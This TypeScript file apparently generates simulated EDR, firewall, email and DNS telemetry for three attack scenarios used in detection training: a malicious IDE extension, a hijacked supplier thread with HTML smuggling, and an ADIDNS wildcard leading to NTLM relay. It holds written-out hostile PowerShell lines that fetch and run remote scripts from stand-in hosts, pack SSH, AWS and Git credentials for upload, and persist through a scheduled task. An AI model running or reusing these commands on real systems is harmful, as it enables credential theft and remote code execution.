/**
 * Developer, email and network stories.
 *
 *  1. core-ide-extension-theft: an IDE extension host starts a hidden PowerShell, secrets are packed
 *     and uploaded, a scheduled task keeps it running (GlassWorm-style theft of developer credentials).
 *  2. core-thread-hijack-smuggling: a reply in a real supplier thread carries an HTML file that assembles
 *     a ZIP in the browser with no download on the wire, then a script runs.
 *  3. core-adidns-wildcard: a wildcard record in the AD-integrated zone sends mistyped names to one host,
 *     which relays a user's NTLM logon to the file server.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { csAlert, csDns, csFile, csProcess } from "@/lib/sim/emitters/crowdstrike";
import { panConnection, panWeb } from "@/lib/sim/emitters/paloalto";
import { sentinelAlert } from "@/lib/sim/emitters/sentinel";
import { winDetailedShareAccess, winLogon } from "@/lib/sim/emitters/windowsSecurity";
import { ALL_COMPANIES, clock, incident, lookalike, type CoreStoryDef } from "./_kit";

const cx = "nexacorp";
const ms = "Microsoft Corporation";
const PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
const psHash = makeSha256("windows_powershell_v1_signed_microsoft");

// ── 1. Malicious IDE extension ───────────────────────────────────────────────
function ideExtension(): TelemetryEvent[] {
  const T = clock("2026-10-19T14:02:00Z");
  const user = "r.castillo";
  const email = `${user}@nexacorp.com`;
  const host = "WS-ENG-2093";
  const ip = "10.10.20.93";
  const c = { companyId: cx, host, user: email, srcIp: ip };
  const code = `C:\\Users\\${user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe`;
  const ext = `C:\\Users\\${user}\\.vscode\\extensions\\prettier-tools.format-sync-3.2.1`;
  const c2 = "extension-telemetry-hub.example", c2Ip = "203.0.113.213";
  const archive = `C:\\Users\\${user}\\AppData\\Local\\Temp\\wsdata.zip`;
  const stageCmd = `powershell.exe -w hidden -nop -c "iwr https://${c2}/v1/init.ps1 -UseBasicParsing | iex"`;
  const packCmd = `powershell.exe -w hidden -nop -c "Compress-Archive -Path $env:USERPROFILE\\.ssh,$env:USERPROFILE\\.aws,$env:USERPROFILE\\.git-credentials -DestinationPath ${archive}"`;
  return incident("inc:core-ide-ext:1", [
    lookalike(csProcess({
      ...c, id: "cid01", ts: T(0), processName: "powershell.exe", pid: 9012, processPath: PS, cmdline: "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Import-Module PSReadLine\"",
      parentName: "Code.exe", parentPid: 8120, sha256: psHash, signed: true, signatureSubject: ms, severity: "low",
      description: "powershell.exe started by Code.exe on WS-ENG-2093 for r.castillo, importing PSReadLine.",
    }), "The IDE's integrated terminal starts PowerShell this way every time. No hidden window, no network fetch."),
    csFile({
      ...c, id: "cid02", ts: T(1800), path: `${ext}\\dist\\extension.js`, sha256: makeSha256("core-ide-extension-js"), size: 482_113, severity: "low", actorProcess: "Code.exe", actorPid: 8120, actorPath: code, mitre: "T1195.001", tactic: "Initial Access",
      description: "Code.exe (pid 8120) wrote dist\\extension.js for extension prettier-tools.format-sync 3.2.1 under r.castillo's .vscode\\extensions folder.",
    }),
    { ...csProcess({
      ...c, id: "cid03", ts: T(1830), processName: "powershell.exe", pid: 9310, processPath: PS, cmdline: stageCmd, parentName: "Code.exe", parentPid: 8120, sha256: psHash, signed: true, signatureSubject: ms, severity: "high", isDetection: true,
      mitre: "T1059.001", tactic: "Execution",
      description: "powershell.exe started by Code.exe on WS-ENG-2093 with a hidden window, downloading and running init.ps1 from extension-telemetry-hub.example.",
    }), edr_scope: "edr" as const },
    csDns({
      ...c, id: "cid04", ts: T(1831), domain: c2, resolvedIp: c2Ip, processName: "powershell.exe", processPath: PS, pid: 9310, parentName: "Code.exe", parentPid: 8120, severity: "medium", mitre: "T1071.001", tactic: "Command and Control",
      description: "powershell.exe (pid 9310) resolved extension-telemetry-hub.example.",
    }),
    panWeb({
      ...c, id: "cid05", ts: T(1832), url: `https://${c2}/v1/init.ps1`, domain: c2, category: "newly-registered-domain", action: "alert", dstIp: c2Ip, status: 200, bytesIn: 9_412, severity: "medium", mitre: "T1105", tactic: "Command and Control",
      description: "Firewall URL log: WS-ENG-2093 fetched init.ps1 from extension-telemetry-hub.example, a newly registered domain.",
    }),
    csProcess({
      ...c, id: "cid06", ts: T(1860), processName: "powershell.exe", pid: 9402, processPath: PS, cmdline: packCmd, parentName: "powershell.exe", parentPid: 9310, sha256: psHash, signed: true, signatureSubject: ms, severity: "high", mitre: "T1552.001", tactic: "Credential Access",
      description: "A child powershell.exe packed r.castillo's .ssh, .aws and .git-credentials into wsdata.zip in the Temp folder.",
    }),
    csFile({
      ...c, id: "cid07", ts: T(1864), path: archive, sha256: makeSha256("core-ide-archive"), size: 58_204, severity: "medium", actorProcess: "powershell.exe", actorPid: 9402, actorPath: PS, mitre: "T1560.001", tactic: "Collection",
      description: "powershell.exe (pid 9402) wrote wsdata.zip to r.castillo's Temp folder.",
    }),
    panConnection({
      ...c, id: "cid08", ts: T(1880), domain: c2, dstIp: c2Ip, remotePort: 443, app: "ssl", action: "allow", category: "unknown", bytesOut: 61_380, bytesIn: 1_204, severity: "high", mitre: "T1041", tactic: "Exfiltration",
      description: "Firewall: WS-ENG-2093 sent 61380 bytes to 203.0.113.213:443 (extension-telemetry-hub.example).",
    }),
    csProcess({
      ...c, id: "cid09", ts: T(1920), processName: "schtasks.exe", pid: 9540, processPath: "C:\\Windows\\System32\\schtasks.exe", cmdline: `schtasks.exe /Create /SC ONLOGON /TN "IDE Telemetry" /TR "powershell.exe -w hidden -nop -c iwr https://${c2}/v1/init.ps1 -UseBasicParsing | iex"`,
      parentName: "powershell.exe", parentPid: 9310, sha256: makeSha256("windows_schtasks_exe_signed_microsoft"), signed: true, signatureSubject: ms, eventType: "scheduled_task", severity: "high", mitre: "T1053.005", tactic: "Persistence",
      description: "schtasks.exe created an at-logon task named IDE Telemetry that runs PowerShell.",
    }),
  ]);
}

// ── 2. Thread hijack with HTML smuggling ─────────────────────────────────────
function threadHijack(): TelemetryEvent[] {
  const T = clock("2026-10-20T09:14:00Z");
  const user = "c.olsen";
  const email = `${user}@nexacorp.com`;
  const host = "WS-ACC-4477";
  const ip = "10.10.20.77";
  const c = { companyId: cx, host, user: email, srcIp: ip };
  const supplier = "accounts@brightline-supply.example";
  const edge = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", edgeHash = makeSha256("msedge_exe_signed_microsoft");
  const dl = `C:\\Users\\${user}\\Downloads`;
  const htmlHash = makeSha256("core-thread-hijack-html"), zipHash = makeSha256("core-thread-hijack-zip"), jsHash = makeSha256("core-thread-hijack-js");
  const wscript = "C:\\Windows\\System32\\wscript.exe", wsHash = makeSha256("windows_wscript_exe_signed_microsoft");
  const c2 = "statement-archive-cdn.example", c2Ip = "203.0.113.214";
  const mail = (o: { id: string; ts: string; subject: string; msgId: string; file: string; ext: string; sha256: string; size: number; severity: TelemetryEvent["severity"]; description: string; mitre?: string; tactic?: string }): TelemetryEvent => ({
    id: o.id, ts: o.ts, source: "email_gateway", vendor: "Proofpoint", event_type: "email_received", severity: o.severity, user_email: email, src_ip: "198.51.100.208", description: o.description,
    file: { name: o.file, path: o.file, sha256: o.sha256, size: o.size, extension: o.ext },
    ...(o.mitre ? { mitre_technique: o.mitre } : {}), ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    raw: {
      "pps.QID": `3Fa${o.msgId.slice(1, 7)}`, "pps.messageID": o.msgId, "pps.sender": supplier, "pps.headerFrom": `"Brightline Supply Accounts" <${supplier}>`, "pps.recipient": email, "pps.subject": o.subject, "pps.senderIP": "198.51.100.208",
      "pps.spf": "pass", "pps.dkim": "pass", "pps.dmarc": "pass", "pps.phishScore": 9, "pps.spamScore": 4, "pps.policyRoutes": ["default_inbound"], "pps.action": "delivered",
    },
  });
  return incident("inc:core-thread-hijack:1", [
    lookalike(csProcess({
      ...c, id: "cth01", ts: T(0), processName: "msedge.exe", pid: 6910, processPath: edge, cmdline: `"${edge}" --single-argument file:///${dl.replace(/\\/g, "/")}/Benefits_Guide_2026.html`, parentName: "explorer.exe", parentPid: 3120, sha256: edgeHash, signed: true, signatureSubject: ms, severity: "low",
      description: "msedge.exe started from explorer.exe on WS-ACC-4477 and opened Benefits_Guide_2026.html from a local file path.",
    }), "HR's self-contained benefits guide, mailed to all staff. The page is only read: Edge writes no file and no script host follows."),
    mail({
      id: "cth02", ts: T(90000), subject: "RE: PO 44128 revised delivery date", msgId: "<e0c73a91b5f2@brightline-supply.example>", file: "Remittance_44128.html", ext: "html", sha256: htmlHash, size: 1_482_330, severity: "medium", mitre: "T1566.001", tactic: "Initial Access",
      description: "A second reply from accounts@brightline-supply.example in the PO 44128 thread was delivered to c.olsen with Remittance_44128.html, 1.4 MB. SPF, DKIM and DMARC pass.",
    }),
    csProcess({
      ...c, id: "cth03", ts: T(90420), processName: "msedge.exe", pid: 7240, processPath: edge, cmdline: `"${edge}" --single-argument file:///${dl.replace(/\\/g, "/")}/Remittance_44128.html`, parentName: "explorer.exe", parentPid: 3120, sha256: edgeHash, signed: true, signatureSubject: ms, severity: "low", mitre: "T1204.002", tactic: "Execution",
      description: "msedge.exe started from explorer.exe on WS-ACC-4477 and opened Remittance_44128.html, saved from the mail, from a local file path.",
    }),
    csFile({
      ...c, id: "cth04", ts: T(90424), path: `${dl}\\Remittance_44128.zip`, sha256: zipHash, size: 96_412, severity: "medium", actorProcess: "msedge.exe", actorPid: 7240, actorPath: edge, mitre: "T1027.006", tactic: "Stealth",
      description: "msedge.exe (pid 7240) wrote Remittance_44128.zip to c.olsen's Downloads.",
    }),
    { ...csProcess({
      ...c, id: "cth05", ts: T(90480), processName: "wscript.exe", pid: 7388, processPath: wscript, cmdline: `wscript.exe "${dl}\\Remittance_44128\\Remittance_44128.js"`, parentName: "explorer.exe", parentPid: 3120, sha256: wsHash, signed: true, signatureSubject: ms, severity: "high", isDetection: true, mitre: "T1059.007", tactic: "Execution",
      description: "wscript.exe ran Remittance_44128.js from a folder in c.olsen's Downloads, started from explorer.exe.",
    }), edr_scope: "edr" as const },
    csProcess({
      ...c, id: "cth06", ts: T(90486), processName: "powershell.exe", pid: 7452, processPath: PS, cmdline: `powershell.exe -w hidden -nop -c "iwr https://${c2}/a/stage.dat -OutFile $env:LOCALAPPDATA\\Temp\\stage.dat"`, parentName: "wscript.exe", parentPid: 7388, sha256: psHash, signed: true, signatureSubject: ms, severity: "high", mitre: "T1105", tactic: "Command and Control",
      description: "powershell.exe started by wscript.exe downloaded stage.dat from statement-archive-cdn.example.",
    }),
    csDns({
      ...c, id: "cth07", ts: T(90487), domain: c2, resolvedIp: c2Ip, processName: "powershell.exe", processPath: PS, pid: 7452, parentName: "wscript.exe", parentPid: 7388, severity: "medium", mitre: "T1071.001", tactic: "Command and Control",
      description: "powershell.exe (pid 7452) resolved statement-archive-cdn.example.",
    }),
    panWeb({
      ...c, id: "cth08", ts: T(90488), url: `https://${c2}/a/stage.dat`, domain: c2, category: "newly-registered-domain", action: "alert", dstIp: c2Ip, status: 200, bytesIn: 388_120, severity: "high", mitre: "T1105", tactic: "Command and Control",
      description: "Firewall URL log: WS-ACC-4477 fetched stage.dat from statement-archive-cdn.example, a newly registered domain.",
    }),
    csFile({
      ...c, id: "cth09", ts: T(90492), path: `C:\\Users\\${user}\\AppData\\Local\\Temp\\stage.dat`, sha256: jsHash, size: 388_120, severity: "medium", actorProcess: "powershell.exe", actorPid: 7452, actorPath: PS, mitre: "T1105", tactic: "Command and Control",
      description: "powershell.exe (pid 7452) wrote stage.dat to c.olsen's Temp folder.",
    }),
  ]);
}

// ── 3. AD-integrated DNS wildcard record ─────────────────────────────────────
function adidnsWildcard(): TelemetryEvent[] {
  const T = clock("2026-10-21T11:30:00Z");
  const DC = "SRV-NXC-DC01", FS = "SRV-NXC-FS01";
  const attacker = "b.iyer", rogueHost = "LT-TEMP-7741", rogueIp = "10.10.20.177";
  const victim = "e.navarro";
  const victimHost = "WS-OPS-2214", victimIp = "10.10.20.14";
  const dnsAudit = (o: { id: string; ts: string; eventId: "515" | "519"; name: string; rdata: string; srcIp: string; user: string; host: string; description: string; severity: TelemetryEvent["severity"]; mitre?: string; tactic?: string }): TelemetryEvent => ({
    id: o.id, ts: o.ts, source: "dns", vendor: "Windows DNS", event_type: "dns_query", severity: o.severity, hostname: o.host, src_ip: o.srcIp, user_email: `${o.user}@nexacorp.com`,
    dns: { query: o.name, query_type: "A", response: o.rdata, rcode: "NOERROR" }, description: o.description,
    ...(o.mitre ? { mitre_technique: o.mitre } : {}), ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    raw: {
      "winlog.event_id": o.eventId, "winlog.channel": "Microsoft-Windows-DNS-Server/Audit", "winlog.event_data.Type": "1", "winlog.event_data.NAME": o.name, "winlog.event_data.TTL": "600", "winlog.event_data.RDATA": o.rdata, "winlog.event_data.Zone": "nexacorp.com",
      "winlog.event_data.Source": o.srcIp, "source.ip": o.srcIp,
    },
  });
  const resolve = (id: string, ts: string, name: string, description: string): TelemetryEvent => ({
    id, ts, source: "dns", vendor: "Windows DNS", event_type: "dns_query", severity: "medium", hostname: victimHost, src_ip: victimIp, user_email: `${victim}@nexacorp.com`,
    dns: { query: name, query_type: "A", response: rogueIp, rcode: "NOERROR" }, description, mitre_technique: "T1557.001", mitre_tactic: "Credential Access",
    raw: { "dns.question.name": name, "dns.question.type": "A", "dns.answers.data": rogueIp, "dns.response_code": "NOERROR", "source.ip": victimIp },
  });
  return incident("inc:core-adidns:1", [
    lookalike(dnsAudit({
      id: "cad01", ts: T(0), eventId: "519", name: "ws-mkt-3301.nexacorp.com.", rdata: "10.10.20.33", srcIp: "10.10.20.33", user: "a.moreau", host: "WS-MKT-3301", severity: "low",
      description: "DNS Server audit 519: record ws-mkt-3301.nexacorp.com created by dynamic update from 10.10.20.33.",
    }), "A workstation registering its own name after a DHCP renewal. The name is the host's own and the address is the host's own."),
    dnsAudit({
      id: "cad02", ts: T(1200), eventId: "515", name: "*.nexacorp.com.", rdata: rogueIp, srcIp: rogueIp, user: attacker, host: rogueHost, severity: "high", mitre: "T1557.001", tactic: "Credential Access",
      description: "DNS Server audit 515: wildcard record *.nexacorp.com created with address 10.10.20.177 from 10.10.20.177.",
    }),
    { ...sentinelAlert({
      companyId: cx, id: "cad03", ts: T(1260), user: `${attacker}@nexacorp.com`, host: DC, srcIp: rogueIp, alertName: "Wildcard record created in an AD-integrated zone", severity: "high", mitre: "T1557.001", tactic: "Credential Access",
      detail: "A DNS audit record created a wildcard name in the domain's zone.", extendedProperties: { Zone: "nexacorp.com", RecordName: "*.nexacorp.com", RecordData: rogueIp },
      description: "Sentinel analytic: wildcard record in zone nexacorp.com pointing at 10.10.20.177.",
    }), edr_scope: "non_edr" as const },
    resolve("cad04", T(1500), "filesrv02.nexacorp.com", "DNS: WS-OPS-2214 resolved filesrv02.nexacorp.com to 10.10.20.177."),
    winLogon({
      companyId: cx, id: "cad05", ts: T(1503), host: FS, targetUser: victim, logonType: 3, srcIp: rogueIp, authPackage: "NTLM", workstation: victimHost, lmPackage: "NTLM V2", keyLength: "128", logSource: "windows_security", severity: "high", mitre: "T1557.001", tactic: "Credential Access",
      description: "Security log 4624 on SRV-NXC-FS01: network logon for e.navarro using NTLM from 10.10.20.177, workstation name WS-OPS-2214.",
    }),
    winDetailedShareAccess({
      companyId: cx, id: "cad06", ts: T(1560), host: FS, targetUser: victim, srcIp: rogueIp, shareName: "\\\\*\\Operations$", shareLocalPath: "\\??\\D:\\Shares\\Operations", relativeTargetName: "Contracts\\2026\\master-services.docx", accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1039", tactic: "Collection",
      description: "Security log 5145 on SRV-NXC-FS01: e.navarro read Contracts\\2026\\master-services.docx on Operations$ from 10.10.20.177.",
    }),
    resolve("cad07", T(1800), "printhub.nexacorp.com", "DNS: WS-OPS-2214 resolved printhub.nexacorp.com to 10.10.20.177."),
  ]);
}

export const MISC_STORIES: CoreStoryDef[] = [
  { id: "core-ide-extension-theft", title: "Malicious IDE Extension: Developer Secrets Packed and Uploaded", complexity: "core", events: ideExtension() },
  { id: "core-thread-hijack-smuggling", title: "Supplier Thread Hijack with an HTML-Smuggled ZIP", complexity: "core", companies: ALL_COMPANIES, events: threadHijack() },
  { id: "core-adidns-wildcard", title: "Wildcard DNS Record Sends Mistyped Names to One Host, NTLM Relay Follows", complexity: "core", companies: ["nexacorp", "globallogis"], events: adidnsWildcard() },
];
